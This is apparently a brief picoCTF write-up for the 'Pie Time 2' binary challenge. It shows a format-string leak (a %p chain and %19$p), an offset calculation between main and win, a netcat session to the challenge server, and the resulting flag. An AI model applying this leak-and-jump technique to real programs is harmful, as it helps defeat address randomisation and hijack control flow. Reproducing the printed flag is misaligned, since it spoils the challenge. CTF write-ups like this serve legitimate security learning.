PicoCTF



Problem name: Pie Time 2

Problem statement: Get the flag by doing binary exploitation


Step 1: chmod +x vuln to change the mode of the file
Step 2: use ./vuln and then "Enter your name:" will appear
As we cannot write the name in direct, we need to use ps ax command to display a complete snapshot of every running process on the system

Step 3: ps ax | grep vuln
Step 4: use gdb -p 9046
then it will show all the addresses related to the problem

in the "Enter your name:" we may try by using %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p to find out all the addresses from there

from stack:

win address: 0x000056212ce2d36a
main address: 0x000056212ce2d400


subtract the win address from the main address

offset: 0xD7

And I noticed at the 19th place from the start of the output: 0x55e68426a441. It didn’t end with a “400,” but it was close! To double check, I disassembled main(), again, and saw this address as part of the function!


I immediately launched the instance and connected to the server via netcat:
nc rescued-float.picoctf.net 62502

and then you will get the flag

Enter your name:%19$p
0x6207c32c7441
 enter the address to jump to, ex => 0x12345: 0x6207c32c736a
You won!
Flag: picoCTF{p13_5h0u1dn'7_134k_af46d901}
